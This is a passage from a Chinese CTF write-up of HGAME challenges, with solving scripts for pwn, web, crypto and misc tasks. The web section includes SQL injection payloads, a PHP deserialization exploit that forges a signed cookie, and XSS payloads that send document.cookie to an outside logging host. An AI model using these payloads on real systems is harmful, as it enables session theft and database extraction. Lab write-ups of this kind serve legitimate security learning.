ice.EAVMUBAQHQMVEPDT 第二个就是压缩包密码，解密之后得到Ook!加密，密文解密得base32的密文，去掉data:text;base32,，再解密得base64的密文 最后base64转图片，加上data:image/png;base64,，得二维码，扫码得flag Ook!解密地址：https://tool.bugku.com/brainfuck/[](https://tool.bugku.com/brainfuck/) base64转图片地址：http://tool.chinaz.com/tools/imgtobase 每日推荐打开发现是个流量包，导出HTTP对象，发现有一个很大的文件 将其保存，binwalk分离出一个加密得压缩包，查看属性时发现 ARCHPR破解出密码为759371，解压得到I Love Mondays.mp3 查看频谱图得到flag pwnHard_AAAAAida反编译代码 s和v5相差123，所以： 1234567from pwn import*import timecontext.log_level = &#x27;debug&#x27;cn=remote(&#x27;47.103.214.163&#x27;,20000)cn.sendline(&#x27;a&#x27;*123+&#x27;0O0o\\0O0&#x27;)cn.interactive() Week2webCosmos的博客后台打开发现跳转到?action=login.php，想到了文件包含，php://filter读源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpinclude &quot;config.php&quot;;session_start();&#x2F;&#x2F;Only for debugif (DEBUG_MODE)&#123; if(isset($_GET[&#39;debug&#39;])) &#123; $debug &#x3D; $_GET[&#39;debug&#39;]; if (!preg_match(&quot;&#x2F;^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$&#x2F;&quot;, $debug)) &#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$debug);&quot;); &#125;&#125;if(isset($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: admin.php&quot;); exit();&#125;else &#123; if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123; if ($admin_password &#x3D;&#x3D; md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; $admin_username)&#123; $_SESSION[&#39;username&#39;] &#x3D; $_POST[&#39;username&#39;]; header(&quot;Location: admin.php&quot;); exit(); &#125; else &#123; echo &quot;用户名或密码错误&quot;; &#125; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt; &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;&quot;&gt; &lt;title&gt;Cosmos的博客后台&lt;&#x2F;title&gt; &lt;link href&#x3D;&quot;static&#x2F;signin.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt; &lt;link href&#x3D;&quot;static&#x2F;sticky-footer.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt; &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div class&#x3D;&quot;container&quot;&gt; &lt;form class&#x3D;&quot;form-signin&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;login.php&quot;&gt; &lt;h2 class&#x3D;&quot;form-signin-heading&quot;&gt;后台登陆&lt;&#x2F;h2&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;用户名&quot; required autofocus&gt; &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;密码&quot; required&gt; &lt;input class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;footer class&#x3D;&quot;footer&quot;&gt; &lt;center&gt; &lt;div class&#x3D;&quot;container&quot;&gt; &lt;p class&#x3D;&quot;text-muted&quot;&gt;Created by Annevi&lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;center&gt;&lt;&#x2F;footer&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 查看源码，发现可以用可变变量查看username，而password的MD5又是0e开头 1login.php?debug&#x3D;admin_username &#x2F;&#x2F;读取用户名 现在我们就可以登陆了 1POST: username&#x3D;Cosmos!&amp;password&#x3D;QNKCDZO 再按之前的方式读下admin.php源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) &#123; header(&#39;Location: index.php&#39;); exit();&#125;function insert_img() &#123; if (isset($_POST[&#39;img_url&#39;])) &#123; $img_url &#x3D; @$_POST[&#39;img_url&#39;]; $url_array &#x3D; parse_url($img_url); if (@$url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;timgsa.baidu.com&quot;) &#123; return false; &#125; $c &#x3D; curl_init(); curl_setopt($c, CURLOPT_URL, $img_url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res &#x3D; curl_exec($c); curl_close($c); $avatar &#x3D; base64_encode($res); if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123; return $avatar; &#125; &#125; else &#123; return base64_encode(file_get_contents(&quot;static&#x2F;logo.png&quot;)); &#125;&#125;?&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Cosmos&#39;Blog - 后台管理&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;a href&#x3D;&quot;logout.php&quot;&gt;退出登陆&lt;&#x2F;a&gt; &lt;div style&#x3D;&quot;text-align: center;&quot;&gt; &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt; &lt;legend&gt;插入图片&lt;&#x2F;legend&gt; &lt;p&gt;&lt;label&gt;图片url: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;img_url&quot; placeholder&#x3D;&quot;&quot;&gt;&lt;&#x2F;label&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;button type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&gt;插入&lt;&#x2F;button&gt;&lt;&#x2F;p&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;form&gt; &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt; &lt;legend&gt;评论管理&lt;&#x2F;legend&gt; &lt;h2&gt;待开发..&lt;&#x2F;h2&gt; &lt;&#x2F;fieldset&gt; &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;&quot;&gt; &lt;legend&gt;文章列表&lt;&#x2F;legend&gt; &lt;h2&gt;待开发..&lt;&#x2F;h2&gt; &lt;&#x2F;fieldset&gt; &lt;fieldset style&#x3D;&quot;height: 50%&quot;&gt; &lt;div style&#x3D;&quot;text-align: center;&quot;&gt; &lt;img height&#x3D;&#39;200&#39; width&#x3D;&#39;500&#39; src&#x3D;&#39;data:image&#x2F;jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static&#x2F;error.jpg&quot;)); ?&gt;&#39;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 可以按照下面payload构造： 解码即可得flag Cosmos的留言板-1题目是可以sql时间盲注，后来看官方wp联合查询就行，题目过滤了空格，而且将select替换成空 贴一下我脚本的payload吧： 1234567891011payload1 = &#x27;/**/and/**/if(length(database())=&#123;&#125;,sleep(3),1)%23&#x27;.format(i) #爆当前数据库长度payload2 = &#x27;/**/and/**/if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(j, k) #爆当前数据库payload3=&#x27;/**/and/**/if(ascii(substr((selselectect/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j) #爆所有数据库，注意limit那里是从0开始payload4=&#x27;/**/and/**/if(ascii(substr((selselectect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j) #爆表payload5=&#x27;/**/and/**/if(ascii(substr((seselectlect/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&quot;&#123;&#125;&quot; limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(te,k,i,j) #爆字段payload6=&#x27;/**/and/**/if(ascii(substring((seselectlect/**/&#123;&#125;/**/from/**/&#123;&#125;.&#123;&#125;/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(co,db,ta,k,i,j) #爆内容 联合查询的payload: 1234567891011121314&#x27;/*1*/union/*1*/selselectect/*1*/database();##得到数据库为easysql&#x27;/*1*/union/*1*/selselectect/*1*/group_concat(table_name)/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema=&#x27;easysql&#x27;;##得到数据库中的所有表名 发现存放flag的表名为f1aggggggggggggg&#x27;/*1*/union/*1*/selselectect/*1*/group_concat(column_name)/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name=&#x27;f1aggggggggggggg&#x27;/*1*/and/*1*/table_schema=&#x27;easysql&#x27;;# #得到flag的字段名为fl4444444g&#x27;/*1*/union/*1*/selselectect/*1*/fl4444444g/*1*/from/*1*/f1aggggggggggggg;##得到flag Cosmos的新语言这题没什莫难度，写脚本就行，不过我的脚本是真的烂，勿喷！2333…. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport reimport base64def dnc(tr): f=&#x27;&#x27; for i in tr: f+=chr(ord(i)-1) return fdef rec(tr): return tr[::-1]def rot13(s, OffSet=13): def encodeCh(ch): f=lambda x: chr((ord(ch)-x+OffSet) % 26 + x) return f(97) if ch.islower() else (f(65) if ch.isupper() else ch) return &#x27;&#x27;.join(encodeCh(c) for c in s)def b64(tr): return str(base64.b64decode(tr.encode()).decode()) # return requests.get(&quot;http://127.0.0.1/base64.php?a=&quot;+tr).textdef met(tr): s=requests.get(&#x27;http://1c75f1a924.php.hgame.n3ko.co/mycode&#x27;) li=re.findall(r&#x27;echo\\(.*\\)&#x27;,s.text)[0] mets=[] m=[&#x27;str_rot13&#x27;,&#x27;base64_encode&#x27;,&#x27;encrypt&#x27;,&#x27;strrev&#x27;] for l in li.split(&#x27;(&#x27;): if l in m: mets.append(l) mets.reverse() de=&quot;&quot; for j in mets: if j==&quot;base64_encode&quot;: de+=&#x27;b64(&#x27; elif j==&quot;str_rot13&quot;: de+=&quot;rot13(&quot; elif j==&quot;strrev&quot;: de+=&quot;rec(&quot; elif j==&quot;encrypt&quot;: de+=&quot;dnc(&quot; de+=&quot;&#x27;&quot;+tr+&quot;&#x27;&quot; de+=de.count(&quot;(&quot;)*&quot;)&quot; print(de) return eval(de)url=&#x27;http://1c75f1a924.php.hgame.n3ko.co/&#x27;q=requests.session()r=q.get(url)r.encoding=&quot;utf-8&quot;tr=str(re.findall(r&#x27;&lt;br&gt;\\n(.*)&lt;br&gt;&#x27;,r.text)[-1])data=&#123;&quot;token&quot;:met(tr)&#125;# print(data)r=q.post(url,data=data)print(r.text) Cosmos的聊天室本题考察的是xss 经过测试，发现script标签过滤，&lt;&gt;有单双引号闭合会替换成空，发现img标签可用 最终构造出来： 1&lt;img src=&quot;&quot; onerror=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#46;&amp;#109;&amp;#111;&amp;#111;&amp;#110;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#46;&amp;#120;&amp;#121;&amp;#122;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&quot;# 实体编码代表的意思是 1document.location=&#x27;http://xss.moonback.xyz/?&#x27;+document.cookie 通过日志就可看到token了，最后 另外一个payload 1&lt;img src=&quot;&quot; onerror=&quot;&amp;#x73;&amp;#x3d;&amp;#x6e;&amp;#x65;&amp;#x77;&amp;#x20;&amp;#x49;&amp;#x6d;&amp;#x61;&amp;#x67;&amp;#x65;&amp;#x28;&amp;#x29;&amp;#x3b;&amp;#x73;&amp;#x2e;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2e;&amp;#x6d;&amp;#x6f;&amp;#x6f;&amp;#x6e;&amp;#x62;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x2e;&amp;#x78;&amp;#x79;&amp;#x7a;&amp;#x2f;&amp;#x3f;&amp;#x27;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot; 实体编码意思 1s=new Image();s.src=&#x27;http://xss.moonback.xyz/?&#x27;+document.cookie; 官方的writeup: 123&lt;svg/onload=&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 编码内的内容是 window.open(&#39;http://vps-ip&#39;+document.cookie);// miscCosmos的午餐打开两个文件，Capture.pcapng和ssl_log.log wireshark打开流量包，将ssl导入进去 具体操作：编辑-&gt;首选项-&gt;Protocols-&gt;TLS 成功导入，导出HTTP对象发现，有个文件特别大 导出发现是个压缩包，解压得Outguess with key.jpg 由这个文件名字猜测用Outguess隐写的，地址：https://github.com/crorvick/outguess 123sudo apt-get install outguess #安装outguess -k password -d hinden.txt demo.jpg out.jpg #加密outguess -k password -r out.jpg hidden.txt #解密 查看文件属性果然找到密码 解密出来是个url（https://dwz.cn/69rOREdu），访问出错，用curl查看 访问有一个压缩包，解压得一个二维码，扫码得flag 所见即为假题目是个压缩包，16进制查看，发现是zip伪加密，即标志位为14 00 09 00 可以手动将其改为14 00 00 00，也可以直接用winrar恢复 成功解压后发现是一张图片，用strings查看发现最后有F5 key 搜了一下，找到对应的工具：https://github.com/matthewgao/F5-steganography 12java Extract 123456.jpg -p 123456 -e a.txt #隐写解密输出到a.txt,不加-e会直接输出output.txtjava Embed -e 1.txt -p 123456 1.jpg 2.jpg #将1.txt内容隐写到1.jpg输出为2.jpg，密码为123456 在output.txt得到一串16进制字符串，转Ascii字符即可得到flag 地球上最后的夜晚题目解压两个文件，No password.pdf和加密的Last Evenings on Earth.7z 题目考察的是pdf隐写，工具地址：http://wbstego.wbailer.com 直接用工具，密码设置为空，获取隐写内容得到 1Zip Password: OmR#O12#b3b%s*IW 解压压缩包，发现是Last Evenings on Earth.docx，binwalk分离，在word/secret.xml里找到flag 玩玩条码⾸先解压附件，得到7zipPasswordHere.mp4、Code128.7z和JPNPostCode.png 先看下这个JPNPostCode.png，通过文件名可知与日本邮政条码相关 编码规则参考资料：http://help.seagullscientifific.com/2016/en/Subsystems/Symbology/Content/Japanese_Postal.htm 可看出，该条码由四种不同的样式组成（⻓条，上⽅半⻓条，下⽅半⻓条，短条，分别⽤1、2、3、4表 示）。条码由开始标志（1 3）、数字部分（每个数字由三个“条”组成）、字⺟部分（若⽆字⺟则使⽤填 充符号，填充符号为4 2 3）、校验位和结束标志组成 再结合内容为“0123456789”的条码 (在线⽣成：https://barcode.tec-it.com/zh/JapanesePostal?data= 0123456789)： 可以得到数字区域对应的条码编码规律： 0：1 4 4 1：1 1 4 2：1 3 2 3：3 1 2 4：1 2 3 5：1 4 1 6：3 2 1 7：2 1 3 8：2 3 1 9：4 1 1 随后按照这⼀规律⽐对附件中给出的条码，可以解出条码内容为1087627（由于字⺟区域均为填充符 号，因此可以判断出没有信息存在） 再看下7zipPasswordHere.mp4，题目给了两个链接： 【参考资料1】：http://virtualdub2.com/【参考资料2】：https://sourceforge.net/projects/virtualdubffmpeginputplugin/ 结合题⽬给出的参考资料，可以发现对视频进⾏处理需要⽤到VirtualDub2。结合百度搜索，猜想视频经过MSU StegoVideo隐写，MSU StegoVideo链接：http://www.compression.ru/video/stego_video/index_en.html 安装软件，并将插件全部解压⾄plugin32⽂件夹。随后运⾏32位版本VirtualDub2，载⼊插件。Video -&gt; Filters -&gt; Add -&gt; MSU StegoVideo 1.0 -&gt; OK： 弹出MSU StegoVideo插件界⾯。选择 Extract fifile from video，并填好密码和分离出的⽂件的路径 然后打开视频文件，接着Go-&gt; Preview fifiltered 播放一会发现，文件里写入了 解压得到Code128.png，在线解密地址：https://online-barcode-reader.inliteresearch.com cryptoVerification_code有源码，就是一个暴力破解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python3# -*- coding: utf-8 -*-import socketserverimport os, sys, signalimport string, randomfrom hashlib import sha256from secret import FLAGclass Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b&#x27;&#x27; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b&#x27;\\n&#x27; self.request.sendall(msg) except: pass def recv(self, prompt=b&#x27;&gt; &#x27;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): random.seed( os.urandom(8) ) proof = &#x27;&#x27;.join([ random.choice(string.ascii_letters+string.digits) for _ in range(20) ]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(str.encode( &quot;sha256(XXXX+%s) == %s&quot; % (proof[4:],_hexdigest) )) x = self.recv(prompt=b&#x27;Give me XXXX: &#x27;) if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: return False return True def handle(self): signal.alarm(60) if not self.proof_of_work(): return self.send(b&#x27;The secret code?&#x27;) _code = self.recv() if _code == b&#x27;I like playing Hgame&#x27;: self.send(b&#x27;Ok, you find me.&#x27;) self.send(b&#x27;Here is the flag: &#x27; + FLAG) self.send(b&#x27;Bye~&#x27;) else: self.send(b&#x27;Rua!!!&#x27;) self.request.close()class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = &#x27;0.0.0.0&#x27;, 1234 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 写了个exp，很烂2333….. 12345678910111213141516171819202122232425from hashlib import sha256import stringimport socket,res=string.ascii_letters+string.digitssk=socket.socket()sk.connect((&quot;47.98.192.231&quot;,25678))secret=sk.recv(1024).decode()print(secret)ant=re.match(r&quot;sha256\\(XXXX\\+(\\w&#123;16&#125;)\\) == (\\w&#123;64&#125;)&quot;,secret).group(1)txt=re.match(r&quot;sha256\\(XXXX\\+(\\w&#123;16&#125;)\\) == (\\w&#123;64&#125;)&quot;,secret).group(2)for i in s: for j in s: for k in s: for l in s: flag=i+j+k+l if txt==sha256((flag+ant).encode()).hexdigest(): print(flag) print(sk.recv(1024).decode()) sk.send(flag.encode()) print(sk.recv(1024).decode()) sk.send(b&quot;I like playing Hgame&quot;) while sk.recv(1024): print(sk.recv(1024).decode()) exit() Week3web序列之争 - Ordinal Scalesource.zip有源码，在game.php中可以看到： 123&lt;?php if($game-&gt;rank-&gt;Get() === 1)&#123;?&gt; &lt;h2&gt;hgame&#123;flag_is_here&#125;&lt;/h2&gt;&lt;?php &#125;?&gt; 即当我们成为第⼀名时，即可获得 flag。跟进去看⼀下Get()⽅法： 12345678910111213public function __construct()&#123; if(!isset($_SESSION[&#x27;rank&#x27;]))&#123; $this-&gt;Set(rand(2, 1000)); return; &#125; $this-&gt;Set($_SESSION[&#x27;rank&#x27;]);&#125;public function Set($no)&#123; $this-&gt;rank = $no; &#125;public function Get()&#123; return $this-&gt;rank; &#125; 可以看到$rank是从Session⾥⾯取得的。因此我们需要找到设置 Session 的办法。 在Rank类的析构函数中存在设置 Session。同时在 108 ⾏存在unserialize反序列化函数，同时结合 该题名字为 序列之争 因此尝试使⽤反序列化来修改 Session。 然⽽在 unserialize 函数前有⼀步检查： 123456$monsterData = base64_decode($_COOKIE[&#x27;monster&#x27;]);if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); $monsterData 是通过对 Cookie monster 进⾏字符串截取得到的， monster 后有⼀个 32 位的 md5 $sign 进⾏签名检查。这⾥我们就需要知道 encryptKey 的值才能伪造这个签名。 ⽽ encryptKey 是来⾃于 Game 类的 sign 属性： 123456private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125;&#125; ⼊参 $data 的值为数组 [$playerName, $this-&gt;encryptKey] ，元素中含有 encryptKey 。 分析⼀下这个⽅法的功能，这个 init() ⽅法是⽤来初始化欢迎语 welcomeMsg 以及 sign 。 其中欢迎语 welcomeMsg 的⽣成中使⽤了 sprintf 函数，且放在⼀个循环内，第⼆轮循环的 $value 值 即为 encryptKey 。因此存在格式化字符串漏洞。 进⼊游戏，输⼊名字： %s ，即可使得在第⼆轮循环中 %s 的值被 sprintf 函数换成 encryptKey 。点 击 Link Start，拿到 encryptKey ： 1gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL 然后就可以伪造 $sign 了。 但 Rank 类的析构函数： 1234567891011121314public function __destruct()&#123; // 确保程序是跑在服务器上的！ $this-&gt;serverKey = $_SERVER[&#x27;key&#x27;]; if($this-&gt;key === $this-&gt;serverKey)&#123; $_SESSION[&#x27;rank&#x27;] = $this-&gt;rank; &#125;else&#123; // ⾮正常访问 session_start(); session_destroy(); setcookie(&#x27;monster&#x27;, &#x27;&#x27;); header(&#x27;Location: index.php&#x27;); exit; &#125;&#125; 在设置 Session 前会⽐对 key 以及 serverKey 的值，其中 serverKey 是来⾃于服务器的环境变量，这 个值我们⽆法获得。 这⾥有两种⽅法：⼀种是引⽤赋值，可以将 $this-&gt;serverKey 的引⽤赋值给给 $this-&gt;key 。 1$this-&gt;key = &amp;$this-&gt;serverKey 另⼀种⽅法是直接不设置 $key 属性。反序列化时会取 Rank 类中的默认值。 捋下思路： 输入%s获得encryptKey 构造执行反序列化函数，反序列化Rank类，将$rank设置成1 反序列化时会执行__destruct()方法可以引⽤赋值或者不赋值两种方式 最终 exp: 1234567891011121314151617&lt;?phpclass Rank&#123; private $rank = 1; private $serverKey; private $key; public function __construct()&#123; $this-&gt;key = &amp;$this-&gt;serverKey; &#125;&#125;$data = [&#x27;moonback&#x27;, &#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;];$sign = &#x27;&#x27;;foreach($data as $value)&#123; $sign .= md5($sign . $value);&#125;$rank = serialize(new Rank());echo(base64_encode($rank . md5($rank . $sign))); 或者 123456789101112&lt;?phpclass Rank&#123; private $rank = 1; &#125;$data = [&#x27;moonback&#x27;, &#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;];$sign = &#x27;&#x27;;foreach($data as $value)&#123; $sign .= md5($sign . $value);&#125;$rank = serialize(new Rank());echo(base64_encode($rank . md5($rank . $sign))); 输⼊名字 moonback 进⼊游戏，替换 monster Cookie，刷新⻚⾯，成为第⼀名拿到 flag 贴一下代码： cardinal.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;?phperror_reporting(0);session_start();class Game&#123; private $encryptKey = &#x27;SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW&#x27;; public $welcomeMsg = &#x27;%s, Welcome to Ordinal Scale!&#x27;; private $sign = &#x27;&#x27;; public $rank; public function __construct($playerName)&#123; $_SESSION[&#x27;player&#x27;] = $playerName; if(!isset($_SESSION[&#x27;exp&#x27;]))&#123; $_SESSION[&#x27;exp&#x27;] = 0; &#125; $data = [$playerName, $this-&gt;encryptKey]; $this-&gt;init($data); $this-&gt;monster = new Monster($this-&gt;sign); $this-&gt;rank = new Rank(); &#125; private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125; &#125;&#125;class Rank&#123; private $rank; private $serverKey; private $key = &#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;; public function __construct()&#123; if(!isset($_SESSION[&#x27;rank&#x27;]))&#123; $this-&gt;Set(rand(2, 1000)); return; &#125; $this-&gt;Set($_SESSION[&#x27;rank&#x27;]); &#125; public function Set($no)&#123; $this-&gt;rank = $no; &#125; public function Get()&#123; return $this-&gt;rank; &#125; public function Fight($monster)&#123; if($monster[&#x27;no&#x27;] &gt;= $this-&gt;rank)&#123; $this-&gt;rank -= rand(5, 15); if($this-&gt;rank &lt;= 2)&#123; $this-&gt;rank = 2; &#125; $_SESSION[&#x27;exp&#x27;] += rand(20, 200); return array( &#x27;result&#x27; =&gt; true, &#x27;msg&#x27; =&gt; &#x27;&lt;span style=&quot;color:green;&quot;&gt;Congratulations! You win! &lt;/span&gt;&#x27; ); &#125;else&#123; return array( &#x27;result&#x27; =&gt; false, &#x27;msg&#x27; =&gt; &#x27;&lt;span style=&quot;color:red;&quot;&gt;You die!&lt;/span&gt;&#x27; ); &#125; &#125; public function __destruct()&#123; // 确保程序是跑在服务器上的！ $this-&gt;serverKey = $_SERVER[&#x27;key&#x27;]; if($this-&gt;key === $this-&gt;serverKey)&#123; $_SESSION[&#x27;rank&#x27;] = $this-&gt;rank; &#125;else&#123; // 非正常访问 session_start(); session_destroy(); setcookie(&#x27;monster&#x27;, &#x27;&#x27;); header(&#x27;Location: index.php&#x27;); exit; &#125; &#125;&#125;class Monster&#123; private $monsterData; private $encryptKey; public function __construct($key)&#123; $this-&gt;encryptKey = $key; if(!isset($_COOKIE[&#x27;monster&#x27;]))&#123; $this-&gt;Set(); return; &#125; $monsterData = base64_decode($_COOKIE[&#x27;monster&#x27;]); if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); &#125;else&#123; session_start(); session_destroy(); setcookie(&#x27;monster&#x27;, &#x27;&#x27;); header(&#x27;Location: index.php&#x27;); exit; &#125; &#125; $this-&gt;Set(); &#125; public function Set()&#123; $monsterName = [&#x27;无名小怪&#x27;, &#x27;BOSS: The Kernal Cosmos&#x27;, &#x27;小怪: Big Eggplant&#x27;, &#x27;BOSS: The Mole King&#x27;, &#x27;BOSS: Zero Zone Witch&#x27;]; $this-&gt;monsterData = array( &#x27;name&#x27; =&gt; $monsterName[array_rand($monsterName, 1)], &#x27;no&#x27; =&gt; rand(1, 2000), ); $this-&gt;Save(); &#125; public function Get()&#123; return $this-&gt;monsterData; &#125; private function Save()&#123; $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey); setcookie(&#x27;monster&#x27;, base64_encode(serialize($this-&gt;monsterData) . $sign)); &#125;&#125; 二发入魂！这里提供一个新思路来算出种子：https://www.ambionics.io/blog/php-mt-rand-prediction 安全客翻译文章：https://www.anquanke.com/post/id/196831 简单的说，就是如果知道某个随机数的值以及这个随机数前随机数的个数，并且知道与相隔227个随机数的的值，就可以算出seed，当然这个随机数可以是第一个随机数，这时候只需知道第228个随机数的值就可以了 exp: 